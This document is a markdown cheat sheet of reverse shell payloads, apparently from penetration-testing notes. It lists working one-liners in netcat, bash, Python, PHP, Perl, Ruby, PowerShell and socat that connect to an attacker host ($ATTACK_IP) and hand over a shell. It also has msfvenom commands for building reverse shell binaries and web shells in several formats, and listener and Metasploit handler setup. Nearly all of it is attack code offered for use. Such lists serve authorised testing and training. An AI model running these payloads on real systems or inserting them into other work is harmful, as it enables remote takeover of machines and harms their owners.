# Reverse Shells

## Netcat
```bash
# On listener
nc -lvnp 4444

# On target - Linux
nc -e /bin/sh $ATTACK_IP 4444
nc -e /bin/bash $ATTACK_IP 4444

# On target - Windows
nc.exe -e cmd.exe $ATTACK_IP 4444
```

## Bash
```bash
bash -i >& /dev/tcp/$ATTACK_IP/4444 0>&1
exec 5<>/dev/tcp/$ATTACK_IP/4444;cat <&5|while read line;do $line 2>&5 >&5;done
```

## Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACK_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## PHP
```php
php -r '$sock=fsockopen("$ATTACK_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Perl
```perl
perl -e 'use Socket;$i="$ATTACK_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$ATTACK_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('$ATTACK_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=([Text.Encoding]::ASCII).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Socat
```bash
# Attacker
socat -d -d TCP4-LISTEN:4444 STDOUT
# Target
socat TCP4:$ATTACK_IP:4444 EXEC:/bin/bash
```

## MSFVenom
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=$ATTACK_IP LPORT=4444 -f raw -o shell.php
msfvenom -p python/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -o shell.py
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f war -o shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f raw -o shell.jsp
```

## Listeners
```bash
# Basic
nc -lvnp 4444

# With rlwrap (history/arrows)
rlwrap nc -lvnp 4444

# Metasploit multi/handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST $ATTACK_IP
set LPORT 4444
run
```
